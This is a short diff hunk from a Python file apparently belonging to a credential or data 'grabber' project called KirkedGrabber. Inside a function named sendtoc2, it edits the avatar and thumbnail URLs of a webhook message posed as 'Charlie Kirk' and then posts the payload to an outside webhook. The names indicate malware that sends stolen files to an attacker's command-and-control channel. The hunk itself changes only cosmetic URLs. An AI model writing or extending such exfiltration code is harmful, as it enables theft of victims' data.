@@ -732,12 +732,12 @@ def sendtoc2(file):
                 "name": "KirkG"
               },
               "thumbnail": {
-                "url": "https://raw.githubusercontent.com/xvhjs2/kirked-grabber/refs/heads/main/resources/turningpoint.jpg?token=GHSAT0AAAAAADNZAIGIPIIYVWWJHQSO6TRK2LUHU4Q"
+                "url": "https://raw.githubusercontent.com/xvhjs2/KirkedGrabber/refs/heads/main/resources/turningpoint.jpg"
               }
             }
           ],
           "username": "Charlie Kirk",
-          "avatar_url": "https://raw.githubusercontent.com/xvhjs2/kirked-grabber/refs/heads/main/resources/charlie%20kirk.jpg?token=GHSAT0AAAAAADNZAIGJ3NAJT2ZIKP3VZHO22LUHUGQ"
+          "avatar_url": "https://raw.githubusercontent.com/xvhjs2/KirkedGrabber/refs/heads/main/resources/charlie%20kirk.jpg"
     }
         r = requests.post(webhookurl, json=payload)
         # print(r.text)
